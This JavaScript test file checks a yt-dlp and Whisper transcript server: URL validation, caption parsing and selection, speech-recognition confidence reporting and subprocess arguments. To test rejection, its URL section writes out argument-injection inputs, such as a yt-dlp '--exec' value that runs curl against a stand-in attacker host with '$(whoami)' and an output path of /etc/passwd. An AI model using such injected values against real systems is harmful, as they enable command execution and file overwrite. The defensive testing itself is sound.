// Smoke test for the things in this server that can fail quietly.
//
// yt-dlp and Whisper are somebody else's to get right, and when they fail they
// fail loudly — a dead URL is an ERROR line, a missing binary is an ENOENT.
// What is ours is everything that goes wrong while still returning a
// well-formed transcript:
//
//   * the platform read off a URL, and a "URL" that is really a yt-dlp option
//   * the timestamps, which exist so a consumer can check a citation — one that
//     is off, or is 0 because a line of speech parsed as a cue header, points at
//     the wrong moment while still looking checkable
//   * which caption file is chosen out of the several yt-dlp writes, where the
//     wrong pick is a fluent transcript of a different language
//   * whether captions were absent (transcribe) or present but empty (say so),
//     which is the difference between evidence and a confident hallucination
//   * the argv handed to each subprocess, where a dropped flag silently changes
//     what is fetched rather than erroring
//
//   node test.js

process.env.LEO_TRANSCRIPT_MCP_NO_SERVE = "1";

const {
  platformOf,
  checkUrl,
  parseVttTimestamp,
  parseVtt,
  parseJson3,
  parseAsrJson,
  pickSubName,
  captionSource,
  availableLangs,
  captionArgs,
  audioArgs,
  asrArgs,
  ytDlpError,
  stripTags,
  clean,
  hhmmss,
  missingRequired,
} = await import("./index.js");
const assert = await import("node:assert/strict");

// ── The URL ─────────────────────────────────────────────────────────────────

// `platform` is reported to the consumer and is how it decides how much to
// trust the result — TikTok is far more often machine-heard than YouTube. Every
// one of these shapes is a real link somebody pastes.
{
  assert.equal(platformOf("https://www.youtube.com/watch?v=x"), "youtube");
  assert.equal(platformOf("https://youtu.be/x"), "youtube");
  assert.equal(platformOf("https://m.YouTube.com/watch?v=x"), "youtube");
  assert.equal(platformOf("https://www.tiktok.com/@a/video/1"), "tiktok");
  assert.equal(platformOf("https://vm.tiktok.com/ZTDemPmJC/"), "tiktok");
  assert.equal(platformOf("https://example.com/v"), "other");
  assert.equal(platformOf(undefined), "other");
}

// `execFile` with an argument array closes command injection. It does NOT close
// argument injection into yt-dlp itself: these are ordinary array elements that
// yt-dlp would parse as options and obey, so they have to be refused before the
// URL ever reaches an argv.
{
  assert.notEqual(checkUrl("--config-location=/tmp/evil.conf"), null);
  assert.notEqual(checkUrl("--exec=curl evil.example/$(whoami)"), null);
  assert.notEqual(checkUrl("-o/etc/passwd"), null);
  assert.notEqual(checkUrl("file:///etc/passwd"), null);
  assert.notEqual(checkUrl("not a url at all"), null);
  assert.notEqual(checkUrl(""), null);
  assert.notEqual(checkUrl(undefined), null);
}

// And it must still accept everything the compiled package accepts. yt-dlp
// reads a thousand sites and the payload already reports `other` for the rest;
// narrowing to YouTube and TikTok here would remove working behaviour.
{
  assert.equal(checkUrl("https://www.youtube.com/watch?v=8P9BHSVD_vI"), null);
  assert.equal(checkUrl("https://www.tiktok.com/t/ZTDemPmJC/"), null);
  assert.equal(checkUrl("http://example.com/talk.mp4"), null);
  assert.equal(checkUrl("  https://youtu.be/x  "), null);
}

// ── Timestamps ──────────────────────────────────────────────────────────────

// Both cue shapes several tools spell differently: VTT's `.` and SRT's `,`,
// with and without an hour field.
{
  assert.equal(parseVttTimestamp("00:01:15.500 --> 00:01:17.000"), 75.5);
  assert.equal(parseVttTimestamp("01:15,250 --> 01:17,000"), 75.25);
  assert.equal(parseVttTimestamp("00:00:00.000 --> 00:00:02.000"), 0);
  assert.equal(parseVttTimestamp("01:02:03 --> 01:02:04"), 3723);
}

// Not a cue header, and the parser's answer for that is what tells a timing
// line from a line of speech. `Number("")` is 0 in JavaScript, so a header the
// parser half-understood would come back as a confident 0 rather than a miss —
// and every following line of dialogue would be stamped at the start of the
// video, which is a citation that looks checkable and is not.
{
  assert.equal(parseVttTimestamp("just some caption text"), null);
  assert.equal(parseVttTimestamp("the plan --> the outcome"), null);
  assert.equal(parseVttTimestamp(":15 --> :17"), null);
  assert.equal(parseVttTimestamp("aa:bb:cc --> dd:ee:ff"), null);
  assert.equal(parseVttTimestamp("1:2:3:4 --> 5"), null);
  assert.equal(parseVttTimestamp(""), null);
}

// The rendered marker. It is truncated, never rounded: a citation must not
// point at a second the words have not been said in yet.
{
  assert.equal(hhmmss(75), "1:15");
  assert.equal(hhmmss(3725), "1:02:05");
  assert.equal(hhmmss(0), "0:00");
  assert.equal(hhmmss(59.9), "0:59");
  assert.equal(hhmmss(605), "10:05");
  assert.equal(hhmmss(-5), "0:00");
  assert.equal(hhmmss(Number.NaN), "0:00");
}

// ── Caption parsing ─────────────────────────────────────────────────────────

// json3 timings are milliseconds; reporting them as seconds would put every
// citation an hour and a half out on a three-minute video.
{
  const segs = parseJson3(
    JSON.stringify({
      events: [
        { tStartMs: 90000, segs: [{ utf8: "the opening" }, { utf8: " range" }] },
        { tStartMs: 95000, segs: [{ utf8: "\n" }] },
      ],
    }),
  );
  assert.deepEqual(segs, [[90, "the opening range"]]);
}

// A caption file that parses to nothing must parse to *nothing* — the caller
// turns an empty result into an error. A single blank segment would instead be
// a transcript with no words in it, which reads as "the speaker said nothing".
{
  assert.deepEqual(parseJson3('{"events":[{"tStartMs":0,"segs":[{"utf8":"  "}]}]}'), []);
  assert.deepEqual(parseJson3("{}"), []);
  assert.throws(() => parseJson3("not json"), /could not parse json3/);
}

// The scrolling-window shape YouTube auto-captions actually emit. Kept as-is,
// the transcript triples in size and every sentence appears several times — a
// consumer verifying quotes by substring still passes, but a model reading it
// sees the same claim three times and weights it accordingly.
{
  const vtt =
    "WEBVTT\nKind: captions\nLanguage: en\n\n" +
    "00:00:01.000 --> 00:00:03.000\nmark the high\n\n" +
    "00:00:03.000 --> 00:00:05.000\nmark the high\n\n" +
    "00:00:05.000 --> 00:00:07.000\nand the low\n";
  const segs = parseVtt(vtt);
  assert.deepEqual(
    segs.map(([, t]) => t),
    ["mark the high", "and the low"],
  );
  assert.equal(segs[1][0], 5);
}

// SRT cue numbers are a line of their own and are not speech; inline cue markup
// is not speech either. Either one silently ends up inside a quote.
{
  const srt =
    "1\n00:00:01,000 --> 00:00:03,000\n<c.colorE5E5E5>hello</c> there\n\n" +
    "2\n00:00:04,000 --> 00:00:06,000\nsecond line\n";
  assert.deepEqual(parseVtt(srt), [
    [1, "hello there"],
    [4, "second line"],
  ]);
}

// A cue whose text spans several lines is one segment, not several, and the
// header block before the first cue contributes nothing.
{
  const vtt = "WEBVTT\n\n00:00:02.000 --> 00:00:06.000\nfirst half\nsecond half\n";
  assert.deepEqual(parseVtt(vtt), [[2, "first half second half"]]);
  assert.deepEqual(parseVtt("WEBVTT\n\nNOTE nothing here\n"), []);
}

{
  assert.equal(stripTags("<c.colorE5E5E5>hello</c> there"), "hello there");
  assert.equal(clean("  a\n b\t\tc "), "a b c");
}

// ── Choosing the caption file ───────────────────────────────────────────────

// One request routinely writes several files. Directory order is undefined, so
// "whichever came first" picks a different track run to run — and on a Spanish
// video with English auto-translation those files are DIFFERENT LANGUAGES, one
// of them not the one that was asked for. Nothing downstream can detect that:
// the result is a fluent, well-formed transcript of the wrong thing.
{
  const names = ["t.en.vtt", "t.en.json3", "t.info.json"];
  assert.equal(pickSubName(names, "en").name, "t.en.json3", "vtt was picked over json3");
  assert.equal(pickSubName([...names].reverse(), "en").name, "t.en.json3");
}

{
  const names = ["t.en-orig.json3", "t.en.json3", "t.info.json"];
  assert.equal(pickSubName(names, "en").lang, "en", "a variant outranked the requested language");
  assert.equal(
    pickSubName([...names].reverse(), "en").lang,
    "en",
    "the pick depends on directory order",
  );
}

// A variant is still better than nothing when the exact language is absent.
{
  const picked = pickSubName(["t.en-orig.json3", "t.info.json"], "en");
  assert.equal(picked.lang, "en-orig");
  assert.equal(picked.isJson3, true);
}

// Format beats the filename tiebreak. Among equal languages the extensions
// happen to sort json3 < srt < vtt, so a lost format preference is invisible
// there — it only shows between two variants, where the alphabet points the
// other way. json3 timings are explicit per cue; VTT's have to be parsed out of
// a text format several tools spell differently.
{
  const picked = pickSubName(["t.en-GB.vtt", "t.en-orig.json3"], "en");
  assert.equal(picked.name, "t.en-orig.json3", "the filename tiebreak outranked the format");
}

// The metadata file and strays are not caption files. `t.info.json` ends in
// `.json` and sorts before everything — picking it yields a "transcript" made
// of metadata.
{
  assert.equal(pickSubName(["t.info.json"], "en"), null);
  assert.equal(pickSubName(["t.en.json", "audio.webm", "t.info.json"], "en"), null);
  assert.equal(pickSubName([], "en"), null);
}

// A format preference must not outrank the language. Asking for `es` when a
// json3 English track sits next to a VTT Spanish one has to give Spanish.
{
  const picked = pickSubName(["t.en.json3", "t.es.vtt"], "es");
  assert.equal(picked.lang, "es");
  assert.equal(picked.isJson3, false);
}

// ── Metadata ────────────────────────────────────────────────────────────────

// An auto-captioned video writes plain `t.en.json3` — identical in shape to a
// hand-authored track, so any guess from the filename is wrong roughly half the
// time. Only the metadata distinguishes them, and machine captions mangle
// exactly the jargon a consumer is usually looking for.
{
  const auto = { subtitles: {}, automatic_captions: { en: [], "en-orig": [] } };
  assert.equal(captionSource(auto, "en"), "automatic_captions");
  assert.equal(captionSource(auto, "en-orig"), "automatic_captions");

  const manual = { subtitles: { en: [] }, automatic_captions: {} };
  assert.equal(captionSource(manual, "en"), "subtitles");
  // `en-US` is answered by the base code, which is how a hand-authored `en`
  // track is still reported as hand-authored.
  assert.equal(captionSource(manual, "en-US"), "subtitles");
}

// Every JavaScript object inherits `toString`, `constructor` and friends, so a
// membership test that is not an own-property test reports a machine track as
// human-authored for a language code that happens to be one of them.
{
  assert.equal(captionSource({ subtitles: {}, automatic_captions: {} }, "constructor"), "automatic_captions");
  assert.equal(captionSource({}, "en"), "automatic_captions");
}

// "no en captions" is not actionable; "available: es, pt" is. `live_chat` is a
// subtitle track by yt-dlp's reckoning and is not speech, so offering it back
// sends the caller to fetch a chat replay.
{
  const info = { subtitles: { es: [] }, automatic_captions: { pt: [], live_chat: [], es: [] } };
  assert.deepEqual(availableLangs(info), ["es", "pt"]);
  assert.deepEqual(availableLangs({}), []);
}

// ── Speech-to-text ──────────────────────────────────────────────────────────

/** Whisper's real output shape, trimmed to the fields this parses. */
const asrJson = (segs, language) =>
  JSON.stringify({
    language,
    segments: segs.map(([start, text, avg_logprob, no_speech_prob]) => ({
      start,
      end: start + 1,
      text,
      avg_logprob,
      no_speech_prob,
    })),
  });

{
  const { segments, report } = parseAsrJson(
    asrJson(
      [
        [0, "mark the high of the candle", -0.12, 0.01],
        [5, "then wait for the retrace", -0.2, 0.02],
      ],
      "en",
    ),
    "small",
  );
  assert.equal(segments.length, 2);
  assert.equal(segments[1][0], 5);
  assert.equal(segments[0][1], "mark the high of the candle");
  assert.equal(report.confident, true);
  assert.equal(report.low_confidence_segments, 0);
  assert.equal(report.language, "en");
  assert.equal(report.model, "small");
}

// The failure the whole `asr` block exists for. Whisper emits fluent,
// grammatical text for audio containing no such speech — a consumer that
// defends itself by checking quotes against the transcript is fully satisfied
// by that, because the words really are there. The decoder's own confidence is
// the only signal that survives, so it has to be measured and reported.
{
  const segs = Array.from({ length: 8 }, (_, i) => [i, "plausible sounding words", -2.5, 0.05]);
  segs.push([8, "one clear phrase here", -0.1, 0.01], [9, "another clear phrase", -0.1, 0.01]);
  const { report } = parseAsrJson(asrJson(segs, "en"), "small");
  assert.equal(report.low_confidence_segments, 8);
  assert.equal(report.low_confidence_share, 0.8);
  assert.equal(report.confident, false, "a transcript the decoder mostly guessed read as confident");
}

// High no_speech_prob with a healthy logprob: the shape music produces. Whisper
// will happily turn a backing track into lyrics with a confident-looking
// logprob, so the second gate is not redundant.
{
  const segs = Array.from({ length: 10 }, (_, i) => [i, "sounds like real words", -0.2, 0.95]);
  const { report } = parseAsrJson(asrJson(segs, "en"), "small");
  assert.equal(report.low_confidence_segments, 10);
  assert.equal(report.confident, false, "music passed as confident speech");
}

// The boundary itself. A third of segments low is still evidence; more is not.
{
  const at = Array.from({ length: 10 }, (_, i) => [i, "words", i < 3 ? -2.5 : -0.2, 0.01]);
  assert.equal(parseAsrJson(asrJson(at, "en"), "small").report.confident, true);
  const over = Array.from({ length: 10 }, (_, i) => [i, "words", i < 4 ? -2.5 : -0.2, 0.01]);
  assert.equal(parseAsrJson(asrJson(over, "en"), "small").report.confident, false);
}

// Silence and music decode to nothing. An empty transcript would let a consumer
// extract confidently from a video it never heard — "no captions and nothing
// heard" has to arrive as an error, not as a transcript with no words in it.
{
  assert.throws(() => parseAsrJson('{"language":"en","segments":[]}', "small"), /no speech/);
  // Whitespace-only text is the same case wearing a segment.
  assert.throws(() => parseAsrJson(asrJson([[0, "   ", -0.1, 0.01]], "en"), "small"), /no speech/);
}

// The consumer decides what a machine transcript is worth, so it has to be told
// which model produced it, which language was DETECTED, and what the failure
// mode is.
{
  const { report } = parseAsrJson(
    asrJson([[0, "mark the high of the candle", -0.12, 0.01]], "es"),
    "large-v3",
  );
  assert.equal(report.model, "large-v3");
  assert.equal(report.language, "es", "the detected language must be reported");
  assert.match(report.caveat, /fluent text/, "the report does not state the failure mode");
}

// Mean log-probability is always negative, and JavaScript's `Math.round` breaks
// ties toward +Infinity while Rust's `f64::round` breaks them away from zero —
// so a naive round reports a *better* mean than the decoder gave, and disagrees
// with the compiled package on the same input.
{
  const segs = [
    [0, "a", -0.00025, 0.01],
    [1, "b", -0.00025, 0.01],
  ];
  assert.equal(parseAsrJson(asrJson(segs, "en"), "small").report.mean_avg_logprob, -0.0003);
}

// ── Subprocess arguments ────────────────────────────────────────────────────

// Every one of these flags fails quietly when it is wrong: without
// `--write-info-json` there is no title, channel or duration and the payload
// reports empty strings; without `--write-auto-subs` most of YouTube looks
// captionless and is silently routed through speech-to-text, at minutes of CPU
// and a much weaker result; without `--no-playlist` a link with a `list=`
// parameter fetches the whole playlist.
{
  const args = captionArgs("/tmp/scratch/t", "https://youtu.be/x", "en");
  for (const flag of [
    "--skip-download",
    "--no-playlist",
    "--write-info-json",
    "--write-subs",
    "--write-auto-subs",
  ]) {
    assert.ok(args.includes(flag), `caption fetch lost ${flag}`);
  }
  // Scoped to the requested language: YouTube auto-translates into ~100
  // languages and `all` downloads a hundred files to use one. `-live_chat`
  // subtracts the chat replay, which is a subtitle track and is not speech.
  assert.equal(args[args.indexOf("--sub-langs") + 1], "en.*,en,-live_chat");
  // json3 first: its timings are explicit per cue.
  assert.equal(args[args.indexOf("--sub-format") + 1], "json3/vtt/best");
  // The output template has to carry `%(ext)s`, or the caption file and the
  // info json collide on one name and the picker finds nothing.
  assert.equal(args[args.indexOf("-o") + 1], "/tmp/scratch/t.%(ext)s");
  // The URL is the last argument, and it is one argument.
  assert.equal(args[args.length - 1], "https://youtu.be/x");
  assert.equal(args.filter((a) => a === "https://youtu.be/x").length, 1);
}

// The language reaches the pattern verbatim; a hardcoded `en` here would fetch
// English captions and then report them under whatever was asked for.
{
  const args = captionArgs("/tmp/t", "https://youtu.be/x", "es-419");
  assert.equal(args[args.indexOf("--sub-langs") + 1], "es-419.*,es-419,-live_chat");
}

// Audio only. The video stream is never fetched, and no format conversion is
// requested — conversion is the step that would drag in an ffmpeg binary this
// package deliberately does not need.
{
  const args = audioArgs("/tmp/scratch/audio", "https://youtu.be/x");
  assert.equal(args[args.indexOf("-f") + 1], "bestaudio/best");
  assert.equal(args[args.indexOf("-o") + 1], "/tmp/scratch/audio.%(ext)s");
  assert.ok(args.includes("--no-playlist"));
  assert.ok(!args.includes("--extract-audio"), "audio extraction would require ffmpeg");
  assert.equal(args[args.length - 1], "https://youtu.be/x");
}

// The decoder is never told a language, and this is the one flag whose absence
// is worth asserting: forcing one does not fail on a video in another language,
// it makes Whisper TRANSLATE — and the output reads as a confident transcript
// of words nobody said, in the language that was asked for.
{
  const args = asrArgs("small", "/tmp/scratch", "/tmp/scratch/audio.webm");
  assert.ok(!args.includes("--language"), "a forced language turns the decoder into a translator");
  assert.ok(!args.includes("--task"), "--task translate is the same failure by another name");
  assert.equal(args[args.indexOf("--model") + 1], "small");
  assert.equal(args[args.indexOf("--output_format") + 1], "json");
  assert.equal(args[args.indexOf("--output_dir") + 1], "/tmp/scratch");
  // Without VAD, music and silence are decoded into lyrics and filler.
  assert.equal(args[args.indexOf("--vad_filter") + 1], "True");
  assert.equal(args[args.length - 1], "/tmp/scratch/audio.webm");
}

// The model choice reaches the decoder; silently always running `small` would
// look like a working `asr_model` parameter.
{
  assert.equal(asrArgs("large-v3", "/tmp", "/tmp/a.m4a")[1], "large-v3");
}

// ── Errors and required parameters ──────────────────────────────────────────

// yt-dlp's own message is the useful one — "Video unavailable" and "Your IP
// address is blocked from accessing this post" are different jobs for whoever
// reads it, and both arrive under a pile of unrelated chatter.
{
  const stderr =
    "[youtube] Extracting URL\nWARNING: unable to fetch po_token\n" +
    "ERROR: [youtube] x: Video unavailable\n";
  assert.equal(ytDlpError(stderr), "ERROR: [youtube] x: Video unavailable");
  // No ERROR line: say whatever it did say rather than nothing at all.
  assert.equal(ytDlpError("  something odd  "), "something odd");
  assert.equal(ytDlpError(""), "");
}

// Answered locally, before a subprocess is spawned, so a forgotten URL costs
// nothing and reads as what it is.
{
  assert.deepEqual(missingRequired("transcript", {}), ["url"]);
  assert.deepEqual(missingRequired("transcript", { lang: "en" }), ["url"]);
  assert.deepEqual(missingRequired("transcript", { url: "https://youtu.be/x" }), []);
  // An empty string is missing, not present — it would spawn yt-dlp to be told
  // what we already knew.
  assert.deepEqual(missingRequired("transcript", { url: "" }), ["url"]);
  // An unknown tool has no required list; it must report none rather than
  // throw, because the caller answers it as "Unknown tool" a line later.
  assert.deepEqual(missingRequired("nope", {}), []);
}

console.log("ok — url parsing, timestamps, caption choice, confidence and argv hold");
